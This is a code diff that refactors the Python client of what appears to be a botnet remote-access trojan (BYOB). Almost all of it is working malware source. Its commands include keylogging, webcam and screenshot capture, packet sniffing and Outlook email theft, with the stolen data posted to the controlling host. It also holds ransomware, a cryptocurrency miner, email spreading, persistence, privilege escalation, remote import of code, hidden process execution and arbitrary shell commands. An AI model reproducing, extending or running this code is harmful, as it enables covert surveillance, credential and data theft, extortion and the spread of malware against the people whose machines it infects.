@@ -49,10 +49,16 @@ def config(*arg, **options):
         @functools.wraps(function)
         def wrapper(*args, **kwargs):
             return function(*args, **kwargs)
+
         for k,v in options.items():
             setattr(wrapper, k, v)
-        wrapper.platforms = ['win32','linux2','darwin'] if not 'platforms' in options else options['platforms']
+        wrapper.platforms = (
+            ['win32', 'linux2', 'darwin']
+            if 'platforms' not in options
+            else options['platforms']
+        )
         return wrapper
+
     return _config
 
 def threaded(function):
@@ -118,20 +124,21 @@ class Payload():
                 time.sleep(30)
                 continue
             except Exception as e:
-                log("{} error: {}".format(self._get_connection.__name__, str(e)))
+                log(f"{self._get_connection.__name__} error: {str(e)}")
                 sys.exit()
         self.flags.connection.set()
         self.flags.passive.clear()
         return connection
 
     def _get_key(self, connection):
-        if isinstance(connection, socket.socket):
-            if 'diffiehellman' in globals() and callable(globals()['diffiehellman']):
-                return globals()['diffiehellman'](connection)
-            else:
-                raise Exception("unable to complete session key exchange: missing required function 'diffiehellman'")
+        if not isinstance(connection, socket.socket):
+            raise TypeError(
+                f"invalid object type for argument 'connection' (expected {socket.socket}, received {type(connection)})"
+            )
+        if 'diffiehellman' in globals() and callable(globals()['diffiehellman']):
+            return globals()['diffiehellman'](connection)
         else:
-            raise TypeError("invalid object type for argument 'connection' (expected {}, received {})".format(socket.socket, type(connection)))
+            raise Exception("unable to complete session key exchange: missing required function 'diffiehellman'")
 
     def _get_info(self):
         info = {}
@@ -141,7 +148,7 @@ class Payload():
                 if isinstance(info[function], bytes):
                     info[function] = "_b64__" + base64.b64encode(info[function]).decode('ascii')
             except Exception as e:
-                log("{} returned error: {}".format(function, str(e)))
+                log(f"{function} returned error: {str(e)}")
         data = globals()['encrypt_aes'](json.dumps(info), self.key)
         msg = struct.pack('!L', len(data)) + data
         self.connection.sendall(msg)
@@ -163,7 +170,7 @@ class Payload():
                 raise TypeError("keyword argument 'base_url' must be type 'str'")
             if not base_url.startswith('http'):
                 raise ValueError("keyword argument 'base_url' must start with http:// or https://")
-            log('[*] Searching %s' % base_url)
+            log(f'[*] Searching {base_url}')
             path = urlparse.urlsplit(base_url).path
             base = path.strip('/').replace('/','.')
             names = []
@@ -176,7 +183,7 @@ class Payload():
                 if ext in ('.py','.pyc'):
                     module = '.'.join((base, name)) if base else name
                     if module not in target:
-                        log("[+] Adding %s" % module)
+                        log(f"[+] Adding {module}")
                         target.append(module)
                 elif not len(ext):
                     t = threading.Thread(target=self._get_resources, kwargs={'target': target, 'base_url': '/'.join((base_url, n))})
@@ -187,15 +194,27 @@ class Payload():
                     if resource not in target:
                         target.append(resource)
         except Exception as e:
-            log("{} error: {}".format(self._get_resources.__name__, str(e)))
+            log(f"{self._get_resources.__name__} error: {str(e)}")
 
     @threaded
     def _get_prompt_handler(self):
-        self.send_task({"session": self.info.get('uid'), "task": "prompt", "result": "[ %d @ {} ]> ".format(os.getcwd())})
+        self.send_task(
+            {
+                "session": self.info.get('uid'),
+                "task": "prompt",
+                "result": f"[ %d @ {os.getcwd()} ]> ",
+            }
+        )
         while True:
             try:
                 self.flags.prompt.wait()
-                self.send_task({"session": self.info.get('uid'), "task": "prompt", "result": "[ %d @ {} ]> ".format(os.getcwd())})
+                self.send_task(
+                    {
+                        "session": self.info.get('uid'),
+                        "task": "prompt",
+                        "result": f"[ %d @ {os.getcwd()} ]> ",
+                    }
+                )
                 self.flags.prompt.clear()
                 if globals()['_abort']:
                     break
@@ -230,10 +249,7 @@ class Payload():
         :param str path:  target directory (default: current directory)
 
         """
-        if os.path.isdir(path):
-            return os.chdir(path)
-        else:
-            return os.chdir('.')
+        return os.chdir(path) if os.path.isdir(path) else os.chdir('.')
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='ls <path>')
     def ls(self, path='.'):
@@ -244,16 +260,15 @@ class Payload():
         :param str path:  target directory
 
         """
-        output = []
-        if os.path.isdir(path):
-            for line in os.listdir(path):
-                if len('\n'.join(output + [line])) < 2048:
-                    output.append(line)
-                else:
-                    break
-            return '\n'.join(output)
-        else:
+        if not os.path.isdir(path):
             return "Error: path not found"
+        output = []
+        for line in os.listdir(path):
+            if len('\n'.join(output + [line])) < 2048:
+                output.append(line)
+            else:
+                break
+        return '\n'.join(output)
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='cat <path>')
     def cat(self, path):
@@ -293,7 +308,7 @@ class Payload():
         try:
             for attr in ('host', 'user', 'password'):
                 if not locals().get(attr):
-                    raise Exception("missing credential '{}' is required for FTP uploads".format(attr))
+                    raise Exception(f"missing credential '{attr}' is required for FTP uploads")
             path  = ''
             local = time.ctime().split()
             if os.path.isfile(str(source)):
@@ -308,19 +323,22 @@ class Payload():
             if 'tmp' not in host.nlst():
                 host.mkd('/tmp')
             if addr not in host.nlst('/tmp'):
-                host.mkd('/tmp/{}'.format(addr))
+                host.mkd(f'/tmp/{addr}')
             if path:
-                path = '/tmp/{}/{}'.format(addr, os.path.basename(path))
+                path = f'/tmp/{addr}/{os.path.basename(path)}'
+            elif filetype:
+                filetype = (
+                    str(filetype)
+                    if str(filetype).startswith('.')
+                    else f'.{str(filetype)}'
+                )
+                path = f'/tmp/{addr}/{local[1]}-{local[2]}_{local[3]}{filetype}'
             else:
-                if filetype:
-                    filetype = '.' + str(filetype) if not str(filetype).startswith('.') else str(filetype)
-                    path = '/tmp/{}/{}'.format(addr, '{}-{}_{}{}'.format(local[1], local[2], local[3], filetype))
-                else:
-                    path = '/tmp/{}/{}'.format(addr, '{}-{}_{}'.format(local[1], local[2], local[3]))
-            stor = host.storbinary('STOR ' + path, source)
+                path = f'/tmp/{addr}/{local[1]}-{local[2]}_{local[3]}'
+            stor = host.storbinary(f'STOR {path}', source)
             return path
         except Exception as e:
-            return "{} error: {}".format(self.ftp.__name__, str(e))
+            return f"{self.ftp.__name__} error: {str(e)}"
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='pwd')
     def pwd(self, *args):
@@ -342,7 +360,7 @@ class Payload():
         try:
             return eval(code)
         except Exception as e:
-            return "{} error: {}".format(self.eval.__name__, str(e))
+            return f"{self.eval.__name__} error: {str(e)}"
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='wget <url>')
     def wget(self, url, filename=None):
@@ -361,7 +379,7 @@ class Payload():
                 path, _ = urlretrieve(url, filename) if filename else urlretrieve(url)
                 return path
             except Exception as e:
-                log("{} error: {}".format(self.wget.__name__, str(e)))
+                log(f"{self.wget.__name__} error: {str(e)}")
         else:
             return "Invalid target URL - must begin with 'http'"
 
@@ -380,9 +398,9 @@ class Payload():
                 try:
                     self.stop(thread)
                 except Exception as e:
-                    log("{} error: {}".format(self.kill.__name__, str(e)))
+                    log(f"{self.kill.__name__} error: {str(e)}")
         except Exception as e:
-            log("{} error: {}".format(self.kill.__name__, str(e)))
+            log(f"{self.kill.__name__} error: {str(e)}")
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='help [cmd]')
     def help(self, name=None):
@@ -397,14 +415,14 @@ class Payload():
             try:
                 return json.dumps({v.usage: v.func_doc.strip('\n').splitlines()[0].lower() for k,v in vars(Payload).items() if callable(v) if hasattr(v, 'command') if getattr(v, 'command')})
             except Exception as e:
-                log("{} error: {}".format(self.help.__name__, str(e)))
+                log(f"{self.help.__name__} error: {str(e)}")
         elif hasattr(Payload, name) and hasattr(getattr(Payload, name), 'command'):
             try:
                 return json.dumps({getattr(Payload, name).usage: getattr(Payload, name).func_doc})
             except Exception as e:
-                log("{} error: {}".format(self.help.__name__, str(e)))
+                log(f"{self.help.__name__} error: {str(e)}")
         else:
-            return "'{}' is not a valid command and is not a valid module".format(name)
+            return f"'{name}' is not a valid command and is not a valid module"
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='load <module> [target]')
     def load(self, args):
@@ -424,20 +442,20 @@ class Payload():
         elif len(args) == 2:
             module, target = args
         else:
-            return "usage: {}".format(self.load.usage)
+            return f"usage: {self.load.usage}"
         target = globals()[target].__dict__ if bool(target in globals() and hasattr(target, '__dict__')) else globals()
         host, port = self.connection.getpeername()
-        base_url_1 = 'http://{}:{}'.format(host, port + 1)
-        base_url_2 = 'http://{}:{}'.format(host, port + 2)
+        base_url_1 = f'http://{host}:{port + 1}'
+        base_url_2 = f'http://{host}:{port + 2}'
         with globals()['remote_repo'](self.remote['packages'], base_url_2):
             with globals()['remote_repo'](self.remote['modules'], base_url_1):
                 try:
-                    exec('import {}'.format(module), target)
-                    log('[+] {} remotely imported'.format(module))
-                    return '[+] {} remotely imported'.format(module)
+                    exec(f'import {module}', target)
+                    log(f'[+] {module} remotely imported')
+                    return f'[+] {module} remotely imported'
                 except Exception as e:
-                    log("{} error: {}".format(self.load.__name__, str(e)))
-                    return "{} error: {}".format(self.load.__name__, str(e))
+                    log(f"{self.load.__name__} error: {str(e)}")
+                    return f"{self.load.__name__} error: {str(e)}"
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='stop <job>')
     def stop(self, target):
@@ -448,14 +466,13 @@ class Payload():
         :param str target:    name of job to stop
         """
         try:
-            if target in self.handlers:
-                _ = self.handlers.pop(target, None)
-                del _
-                return "Job '{}' was stopped.".format(target)
-            else:
-                return "Job '{}' not found".format(target)
+            if target not in self.handlers:
+                return f"Job '{target}' not found"
+            _ = self.handlers.pop(target, None)
+            del _
+            return f"Job '{target}' was stopped."
         except Exception as e:
-            log("{} error: {}".format(self.stop.__name__, str(e)))
+            log(f"{self.stop.__name__} error: {str(e)}")
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='show <value>')
     def show(self, attribute):
@@ -483,17 +500,17 @@ class Payload():
                     try:
                         return json.dumps(vars(getattr(self, attribute)))
                     except: pass
-            elif hasattr(self, str('_%s' % attribute)):
+            elif hasattr(self, str(f'_{attribute}')):
                 try:
-                    return json.dumps(getattr(self, str('_%s' % attribute)))
+                    return json.dumps(getattr(self, str(f'_{attribute}')))
                 except:
                     try:
-                        return json.dumps(vars(getattr(self, str('_%s' % attribute))))
+                        return json.dumps(vars(getattr(self, str(f'_{attribute}'))))
                     except: pass
             else:
                 return self.show.usage
         except Exception as e:
-            log("'{}' error: {}".format(_threads.__name__, str(e)))
+            log(f"'{_threads.__name__}' error: {str(e)}")
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='abort')
     def abort(self, *args):
@@ -510,9 +527,9 @@ class Payload():
                 for method in persistence.methods:
                     if persistence.methods[method].get('established'):
                         try:
-                            remove = getattr(persistence, 'remove_{}'.format(method))()
+                            remove = getattr(persistence, f'remove_{method}')()
                         except Exception as e2:
-                            log("{} error: {}".format(method, str(e2)))
+                            log(f"{method} error: {str(e2)}")
             if not _debug:
                 delete(sys.argv[0])
         finally:
@@ -569,15 +586,14 @@ class Payload():
         if 'miner' not in globals():
             self.load('miner')
         args = str(args).split()
-        if len(args) == 3:
-            url, username, password = args
-            try:
-                globals()['miner'].run(url, username, password)
-                return """Bitcoin miner running in background\nURL: {0}\nUser: {1}""".format(url, username)
-            except Exception as e:
-                return "{} error: {}".format(self.miner.__name__, str(e))
-        else:
-            return "usage: {}".format(self.miner.usage)
+        if len(args) != 3:
+            return f"usage: {self.miner.usage}"
+        url, username, password = args
+        try:
+            globals()['miner'].run(url, username, password)
+            return """Bitcoin miner running in background\nURL: {0}\nUser: {1}""".format(url, username)
+        except Exception as e:
+            return f"{self.miner.__name__} error: {str(e)}"
 
     @config(platforms=['win32','linux2','darwin'], command=False)
     def imgur(self, source, api_key=None):
@@ -589,19 +605,18 @@ class Payload():
 
         """
         try:
-            if api_key:
-                if not isinstance(api_key, str):
-                    raise TypeError("argument 'api_key' data type must be: {}".format(str))
-                if not api_key.lower().startswith('client-id'):
-                    api_key  = 'Client-ID {}'.format(api_key)
-                if 'normalize' in globals():
-                    source = normalize(source)
-                post = post('https://api.imgur.com/3/upload', headers={'Authorization': api_key}, data={'image': base64.b64encode(source), 'type': 'base64'})
-                return str(json.loads(post)['data']['link'])
-            else:
+            if not api_key:
                 return "No Imgur API Key found"
+            if not isinstance(api_key, str):
+                raise TypeError(f"argument 'api_key' data type must be: {str}")
+            if not api_key.lower().startswith('client-id'):
+                api_key = f'Client-ID {api_key}'
+            if 'normalize' in globals():
+                source = normalize(source)
+            post = post('https://api.imgur.com/3/upload', headers={'Authorization': api_key}, data={'image': base64.b64encode(source), 'type': 'base64'})
+            return str(json.loads(post)['data']['link'])
         except Exception as e2:
-            return "{} error: {}".format(self.imgur.__name__, str(e2))
+            return f"{self.imgur.__name__} error: {str(e2)}"
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='upload <mode> [file]')
     def upload(self, filename):
@@ -619,13 +634,13 @@ class Payload():
                 with open(filename, 'rb') as fp:
                     source = base64.b64encode(fp.read())
                 data = {filetype: source}
-                globals()['post']('http://{}:{}'.format(host, port+3), json=data)
+                globals()['post'](f'http://{host}:{port + 3}', json=data)
                 return "Upload complete"
             else:
                 return "Error: file not found"
         except Exception as e:
-            log("{} error: {}".format(self.upload.__name__, str(e)))
-            return "Error: {}".format(str(e))
+            log(f"{self.upload.__name__} error: {str(e)}")
+            return f"Error: {str(e)}"
 
     @config(platforms=['win32','linux2','darwin'], registry_key=r"Software\BYOB", command=True, usage='ransom <mode> [path]')
     def ransom(self, args):
@@ -673,17 +688,17 @@ class Payload():
                 img = globals()['webcam'].image(*args)
                 data = {"png": img}
                 host, port = self.connection.getpeername()
-                globals()['post']('http://{}:{}'.format(host, port+3), json=data)
+                globals()['post'](f'http://{host}:{port + 3}', json=data)
             elif 'video' in args:
                 vid = globals()['webcam'].video(*args)
                 data = {"avi": vid}
                 host, port = self.connection.getpeername()
-                globals()['post']('http://{}:{}'.format(host, port+3), json=data)
+                globals()['post'](f'http://{host}:{port + 3}', json=data)
             else:
                 return self.webcam.usage
             return "Webcam capture complete"
         except Exception as e:
-            log("{} error: {}".format(self.webcam.__name__, str(e)))
+            log(f"{self.webcam.__name__} error: {str(e)}")
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='passive')
     def passive(self):
@@ -691,7 +706,7 @@ class Payload():
         Keep client alive while waiting to re-connect
 
         """
-        log("{} : Bot entering passive mode awaiting C2.".format(self.passive.__name__))
+        log(f"{self.passive.__name__} : Bot entering passive mode awaiting C2.")
         self.flags.connection.clear()
         self.flags.passive.set()
 
@@ -702,12 +717,12 @@ class Payload():
 
         """
         try:
-            log("{} failed - restarting in 3 seconds...".format(output))
+            log(f"{output} failed - restarting in 3 seconds...")
             self.kill()
             time.sleep(3)
             os.execl(sys.executable, 'python', os.path.abspath(sys.argv[0]), *sys.argv[1:])
         except Exception as e:
-            log("{} error: {}".format(self.restart.__name__, str(e)))
+            log(f"{self.restart.__name__} error: {str(e)}")
 
     @config(platforms=['win32','darwin'], command=True, usage='outlook <option> [mode]')
     def outlook(self, args=None):
@@ -722,33 +737,33 @@ class Payload():
             self.load('outlook')
         elif not args:
             try:
-                if not globals()['outlook'].installed():
-                    return "Error: Outlook not installed on this host"
-                else:
-                    return "Outlook is installed on this host"
+                return (
+                    "Outlook is installed on this host"
+                    if globals()['outlook'].installed()
+                    else "Error: Outlook not installed on this host"
+                )
             except: pass
         else:
             try:
                 mode, _, arg   = str(args).partition(' ')
-                if hasattr(globals()['outlook'], mode):
-                    if 'run' in mode:
-                        self.handlers['outlook'] = globals()['outlook'].run()
-                        return "Fetching emails from Outlook inbox..."
-                    elif 'upload' in mode:
-                        results = globals()['outlook'].results
-                        if len(results):
-                            host, port = self.connection.getpeername()
-                            data = {'txt': base64.b64encode(json.dumps(results))}
-                            globals()['post']('http://{}:{}'.format(host, port+3), json=data)
-                            return "Upload of Outlook emails complete"
-                    elif hasattr(globals()['outlook'], mode):
-                        return getattr(globals()['outlook'], mode)()
-                    else:
-                        return "Error: invalid mode '%s'" % mode
-                else:
+                if not hasattr(globals()['outlook'], mode):
                     return self.outlook.usage
+                if 'run' in mode:
+                    self.handlers['outlook'] = globals()['outlook'].run()
+                    return "Fetching emails from Outlook inbox..."
+                elif 'upload' in mode:
+                    results = globals()['outlook'].results
+                    if len(results):
+                        host, port = self.connection.getpeername()
+                        data = {'txt': base64.b64encode(json.dumps(results))}
+                        globals()['post'](f'http://{host}:{port + 3}', json=data)
+                        return "Upload of Outlook emails complete"
+                elif hasattr(globals()['outlook'], mode):
+                    return getattr(globals()['outlook'], mode)()
+                else:
+                    return f"Error: invalid mode '{mode}'"
             except Exception as e:
-                log("{} error: {}".format(self.email.__name__, str(e)))
+                log(f"{self.email.__name__} error: {str(e)}")
 
     @config(platforms=['win32'], command=True, usage='escalate')
     def escalate(self):
@@ -761,7 +776,7 @@ class Payload():
                 self.load('escalate')
             return globals()['escalate'].run(sys.argv[0])
         except Exception as e:
-            log("{} error: {}".format(self.escalate.__name__, str(e)))
+            log(f"{self.escalate.__name__} error: {str(e)}")
 
     @config(platforms=['win32','linux2','darwin'], process_list={}, command=True, usage='execute <path> [args]')
     def execute(self, args):
@@ -777,22 +792,21 @@ class Payload():
         """
         path, args = [i.strip() for i in args.split('"') if i if not i.isspace()] if args.count('"') == 2 else [i for i in args.partition(' ') if i if not i.isspace()]
         args = [path] + args.split()
-        if os.path.isfile(path):
-            name = os.path.splitext(os.path.basename(path))[0]
+        if not os.path.isfile(path):
+            return f"File '{str(path)}' not found"
+        name = os.path.splitext(os.path.basename(path))[0]
+        try:
+            info = subprocess.STARTUPINFO()
+            info.dwFlags = subprocess.STARTF_USESHOWWINDOW ,  subprocess.CREATE_NEW_ps_GROUP
+            info.wShowWindow = subprocess.SW_HIDE
+            self.execute.process_list[name] = subprocess.Popen(args, startupinfo=info)
+            return f"Running '{path}' in a hidden process"
+        except Exception as e:
             try:
-                info = subprocess.STARTUPINFO()
-                info.dwFlags = subprocess.STARTF_USESHOWWINDOW ,  subprocess.CREATE_NEW_ps_GROUP
-                info.wShowWindow = subprocess.SW_HIDE
-                self.execute.process_list[name] = subprocess.Popen(args, startupinfo=info)
-                return "Running '{}' in a hidden process".format(path)
+                self.execute.process_list[name] = subprocess.Popen(args, 0, None, None, subprocess.PIPE, subprocess.PIPE)
+                return f"Running '{name}' in a new process"
             except Exception as e:
-                try:
-                    self.execute.process_list[name] = subprocess.Popen(args, 0, None, None, subprocess.PIPE, subprocess.PIPE)
-                    return "Running '{}' in a new process".format(name)
-                except Exception as e:
-                    log("{} error: {}".format(self.execute.__name__, str(e)))
-        else:
-            return "File '{}' not found".format(str(path))
+                log(f"{self.execute.__name__} error: {str(e)}")
 
     @config(platforms=['win32'], command=True, usage='process <mode>')
     def process(self, args=None):
@@ -813,21 +827,20 @@ class Payload():
                 cmd, _, action = str(args).partition(' ')
                 if 'monitor' in cmd:
                     self.handlers['process_monitor'] = globals()['process'].monitor(action)
-                    return "Monitoring process creation for keyword: {}".format(action)
+                    return f"Monitoring process creation for keyword: {action}"
                 elif 'upload' in cmd:
                     log = globals()['process'].log.getvalue()
-                    if len(log):
-                        data = {'log': base64.b64encode(log)}
-                        host, port = self.connection.getpeername()
-                        globals()['post']('http://{}:{}'.format(host, port+3), json=data)
-                        return "Process log upload complete"
-                    else:
+                    if not len(log):
                         return "Process log is empty"
+                    data = {'log': base64.b64encode(log)}
+                    host, port = self.connection.getpeername()
+                    globals()['post'](f'http://{host}:{port + 3}', json=data)
+                    return "Process log upload complete"
                 elif hasattr(globals()['process'], cmd):
                     return getattr(globals()['process'], cmd)(action) if action else getattr(globals()['process'], cmd)()
             return "usage: process <mode>\n    mode: block, list, search, kill, monitor"
         except Exception as e:
-            log("{} error: {}".format(self.process.__name__, str(e)))
+            log(f"{self.process.__name__} error: {str(e)}")
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='portscan <target>')
     def portscan(self, target=None):
@@ -842,14 +855,15 @@ class Payload():
         if 'portscanner' not in globals():
             self.load('portscanner')
         try:
-            if target:
-                if not ipv4(target):
-                    return "Error: invalid IP address '%s'" % target
-                return globals()['portscanner'].run(target)
-            else:
+            if not target:
                 return self.portscan.usage
+            return (
+                globals()['portscanner'].run(target)
+                if ipv4(target)
+                else f"Error: invalid IP address '{target}'"
+            )
         except Exception as e:
-            log("{} error: {}".format(self.portscan.__name__, str(e)))
+            log(f"{self.portscan.__name__} error: {str(e)}")
 
     def pastebin(self, source, api_key=None):
         """
@@ -869,11 +883,23 @@ class Payload():
                 info = {'api_option': 'paste', 'api_paste_code': normalize(source), 'api_dev_key': api_key}
                 paste = globals()['post']('https://pastebin.com/api/api_post.php',data=info)
                 parts = urlparse.urlsplit(paste)
-                return urlparse.urlunsplit((parts.scheme, parts.netloc, '/raw' + parts.path, parts.query, parts.fragment)) if paste.startswith('http') else paste
+                return (
+                    urlparse.urlunsplit(
+                        (
+                            parts.scheme,
+                            parts.netloc,
+                            f'/raw{parts.path}',
+                            parts.query,
+                            parts.fragment,
+                        )
+                    )
+                    if paste.startswith('http')
+                    else paste
+                )
             else:
-                return "{} error: no pastebin API key".format(self.pastebin.__name__)
+                return f"{self.pastebin.__name__} error: no pastebin API key"
         except Exception as e:
-            return '{} error: {}'.format(self.pastebin.__name__, str(e))
+            return f'{self.pastebin.__name__} error: {str(e)}'
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='keylogger [mode]')
     def keylogger(self, mode=None):
@@ -890,38 +916,39 @@ class Payload():
                 return "Log size: {} bytes".format(length)
             except Exception as e:
                 log("{} error: {}".format('keylogger.status', str(e)))
+
         if 'keylogger' not in globals():
             self.load('keylogger')
         if not mode:
+            return (
+                globals()['keylogger'].usage
+                if 'keylogger' not in self.handlers
+                else locals()['status']()
+            )
+        if 'run' in mode or 'start' in mode:
             if 'keylogger' not in self.handlers:
-                return globals()['keylogger'].usage
+                self.handlers['keylogger'] = globals()['keylogger'].run()
+                return locals()['status']()
             else:
                 return locals()['status']()
+        elif 'stop' in mode:
+            try:
+                self.stop('keylogger')
+            except: pass
+            try:
+                self.stop('keylogger')
+            except: pass
+            return locals()['status']()
+        elif 'upload' in mode:
+            data = base64.b64encode(globals()['keylogger'].logs.getvalue())
+            host, port = self.connection.getpeername()
+            globals()['post']('http://{}:{}'.format(host, port + 3), json={'txt': data})
+            globals()['keylogger'].logs.reset()
+            return 'Keystroke log upload complete'
+        elif 'status' in mode:
+            return locals()['status']()
         else:
-            if 'run' in mode or 'start' in mode:
-                if 'keylogger' not in self.handlers:
-                    self.handlers['keylogger'] = globals()['keylogger'].run()
-                    return locals()['status']()
-                else:
-                    return locals()['status']()
-            elif 'stop' in mode:
-                try:
-                    self.stop('keylogger')
-                except: pass
-                try:
-                    self.stop('keylogger')
-                except: pass
-                return locals()['status']()
-            elif 'upload' in mode:
-                data = base64.b64encode(globals()['keylogger'].logs.getvalue())
-                host, port = self.connection.getpeername()
-                globals()['post']('http://{}:{}'.format(host, port + 3), json={'txt': data})
-                globals()['keylogger'].logs.reset()
-                return 'Keystroke log upload complete'
-            elif 'status' in mode:
-                return locals()['status']()
-            else:
-                return keylogger.usage
+            return keylogger.usage
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='screenshot <mode>')
     def screenshot(self, mode=None):
@@ -938,10 +965,10 @@ class Payload():
             img = globals()['screenshot'].run()
             data = {"png": img}
             host, port = self.connection.getpeername()
-            globals()['post']('http://{}:{}'.format(host, port+3), json=data)
+            globals()['post'](f'http://{host}:{port + 3}', json=data)
             return 'Screenshot complete'
         except Exception as e:
-            result = "{} error: {}".format(self.screenshot.__name__, str(e))
+            result = f"{self.screenshot.__name__} error: {str(e)}"
             log(result)
             return result
 
@@ -964,20 +991,20 @@ class Payload():
 
         """
         try:
-            if not 'persistence' in globals():
+            if 'persistence' not in globals():
                 self.load('persistence')
             cmd, _, action = str(args).partition(' ')
             if cmd not in ('add','remove'):
                 return self.persistence.usage
             for method in globals()['persistence']._methods:
-                if action == 'all' or action == method:
+                if action in ['all', method]:
                     try:
                         getattr(globals()['persistence']._methods[method], cmd)()
                     except Exception as e:
-                        log("{} error: {}".format(self.persistence.__name__, str(e)))
+                        log(f"{self.persistence.__name__} error: {str(e)}")
             return json.dumps(globals()['persistence'].results())
         except Exception as e:
-            log("{} error: {}".format(self.persistence.__name__, str(e)))
+            log(f"{self.persistence.__name__} error: {str(e)}")
 
     @config(platforms=['linux2','darwin'], capture=[], command=True, usage='packetsniffer [mode]')
     def packetsniffer(self, args):
@@ -1003,18 +1030,17 @@ class Payload():
                     return "Network traffic captured stopped"
                 elif 'upload' in mode:
                     log = globals()['packetsniffer'].log.getvalue()
-                    if len(log):
-                        globals()['packetsniffer'].log.reset()
-                        data = {'pcap': base64.b64encode(log)}
-                        host, port = self.connection.getpeername()
-                        globals()['post']('http://{}:{}'.format(host, port+3), json=data)
-                        return "Network traffic log upload complete"
-                    else:
+                    if not len(log):
                         return "Network traffic log is empty"
+                    globals()['packetsniffer'].log.reset()
+                    data = {'pcap': base64.b64encode(log)}
+                    host, port = self.connection.getpeername()
+                    globals()['post'](f'http://{host}:{port + 3}', json=data)
+                    return "Network traffic log upload complete"
                 else:
                     return self.packetsniffer.usage
         except Exception as e:
-            log("{} error: {}".format(self.packetsniffer.__name__, str(e)))
+            log(f"{self.packetsniffer.__name__} error: {str(e)}")
 
     @config(platforms=['win32','darwin','linux2'], command=True, usage='spread <gmail> <password>')
     def spread(self, args=None):
@@ -1036,7 +1062,7 @@ class Payload():
             recipients = urlopen(url).read().splitlines()
             return globals()['spreader'].run(gmail, password, attachment, recipients)
         except Exception as e:
-            return '{} error: {}'.format(self.spread.__name__, str(e))
+            return f'{self.spread.__name__} error: {str(e)}'
 
     def send_task(self, task):
         """
@@ -1054,7 +1080,7 @@ class Payload():
 
         """
         try:
-            if not 'session' in task:
+            if 'session' not in task:
                 task['session'] = self.info.get('uid')
             if self.flags.connection.wait(timeout=1.0):
                 data = globals()['encrypt_aes'](json.dumps(task), self.key)
@@ -1065,15 +1091,23 @@ class Payload():
         except Exception as e:
             e = str(e)
             if "Errno 104" in e or "10054" in e:
-                log("{} socket error: SERVER DISCONNECTED GRACEFULLY - {}".format(self.send_task.__name__, e))
+                log(
+                    f"{self.send_task.__name__} socket error: SERVER DISCONNECTED GRACEFULLY - {e}"
+                )
                 self.kill()
                 return
             elif "Errno 32" in e or "10052" in e:
-                log("{} socket error: SERVER CRASHED OR INTERRUPTED - {}".format(self.send_task.__name__, e))
+                log(
+                    f"{self.send_task.__name__} socket error: SERVER CRASHED OR INTERRUPTED - {e}"
+                )
             elif "Errno 111" in e or "10061" in e:
-                log("{} socket error: SERVER OFFLINE OR CHANGED PORT - {}".format(self.send_task.__name__, e))
+                log(
+                    f"{self.send_task.__name__} socket error: SERVER OFFLINE OR CHANGED PORT - {e}"
+                )
             else:
-                log("{} socket error: SERVER UNKNOWN COMMUNICATION FAILURE - {}".format(self.send_task.__name__, e))
+                log(
+                    f"{self.send_task.__name__} socket error: SERVER UNKNOWN COMMUNICATION FAILURE - {e}"
+                )
             self.passive()
             #log("{} error: {}".format(self.send_task.__name__, str(e)))
 
@@ -1099,21 +1133,29 @@ class Payload():
                 data = globals()['decrypt_aes'](msg, self.key)
                 return json.loads(data)
             else:
-                log("{} error: invalid header length".format(self.recv_task.__name__))
+                log(f"{self.recv_task.__name__} error: invalid header length")
                 if not self.connection.recv(hdr_len):
                     self.kill()
         except Exception as e:
             e = str(e)
             if "Errno 104" in e or "10054" in e:
-                log("{} socket error: SERVER DISCONNECTED GRACEFULLY - {}".format(self.recv_task.__name__, e))
+                log(
+                    f"{self.recv_task.__name__} socket error: SERVER DISCONNECTED GRACEFULLY - {e}"
+                )
                 self.kill()
                 return
             elif "Errno 32" in e or "10052" in e:
-                log("{} socket error: SERVER CRASHED OR INTERRUPTED - {}".format(self.recv_task.__name__, e))
+                log(
+                    f"{self.recv_task.__name__} socket error: SERVER CRASHED OR INTERRUPTED - {e}"
+                )
             elif "Errno 111" in e or "10061" in e:
-                log("{} socket error: SERVER OFFLINE OR CHANGED PORT - {}".format(self.recv_task.__name__, e))
+                log(
+                    f"{self.recv_task.__name__} socket error: SERVER OFFLINE OR CHANGED PORT - {e}"
+                )
             else:
-                log("{} socket error: SERVER UNKNOWN COMMUNICATION FAILURE - {}".format(self.recv_task.__name__, e))    
+                log(
+                    f"{self.recv_task.__name__} socket error: SERVER UNKNOWN COMMUNICATION FAILURE - {e}"
+                )
             self.passive()
             #log("{} error: {}".format(self.recv_task.__name__, str(e)))
 
@@ -1123,8 +1165,12 @@ class Payload():
 
         """
         host, port = self.connection.getpeername()
-        self._get_resources(target=self.remote['modules'], base_url='http://{}:{}'.format(host, port + 1))
-        self._get_resources(target=self.remote['packages'], base_url='http://{}:{}'.format(host, port + 2))
+        self._get_resources(
+            target=self.remote['modules'], base_url=f'http://{host}:{port + 1}'
+        )
+        self._get_resources(
+            target=self.remote['packages'], base_url=f'http://{host}:{port + 2}'
+        )
         self.handlers['prompt_handler'] = self._get_prompt_handler()
         self.handlers['thread_handler'] = self._get_thread_handler()
         log(json.dumps(self.remote, indent=2))
@@ -1134,7 +1180,7 @@ class Payload():
                 self.connection = self._get_connection(host, port)
                 self.key = self._get_key(self.connection)
                 self.info = self._get_info()
-                log("{} : leaving passive mode.".format(self.run.__name__))
+                log(f"{self.run.__name__} : leaving passive mode.")
                 self.flags.prompt.set()
             elif self.flags.connection.wait(timeout=1.0):
                 if not self.flags.prompt.is_set():
@@ -1142,17 +1188,16 @@ class Payload():
                     if isinstance(task, dict) and 'task' in task:
                         cmd, _, action = task['task'].partition(' ')
                         try:
-                            command = self._get_command(cmd)
-                            if command:
+                            if command := self._get_command(cmd):
                                 result = command(action) if action else command()
                             else:
                                 result, reserr = subprocess.Popen(task['task'].encode(), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate()
-                                if result == None:
+                                if result is None:
                                     result = reserr
